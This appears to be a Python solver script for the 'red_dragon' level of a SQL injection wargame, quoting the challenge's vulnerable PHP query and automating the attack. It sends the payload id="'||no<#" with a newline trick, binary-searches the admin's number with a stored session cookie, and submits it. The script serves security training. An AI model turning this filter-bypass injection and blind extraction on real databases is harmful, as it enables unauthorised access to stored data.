#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello admin' in args[0]


def main():
    '''
    Red_dragon

    if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
    if(strlen($_GET['id']) > 7) exit("too long string");
    $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
    $query = "select id from prob_red_dragon where id='{$_GET['id']}' and no={$no}";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

    $query = "select no from prob_red_dragon where id='admin'"; 
    // if you think challenge got wrong, look column name again.
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['no'] === $_GET['no']) solve("red_dragon");
    '''

    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = {'id': "'||no<#", 'no': '\n%s'}
    result, num_of_requests = los.find_binary(url, param, check_func,
                                              1, 1e10, cook)

    print('num_of_requests:', num_of_requests)
    print(result)

    param = dict(id='admin', no=int(result))
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Red_dragon Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
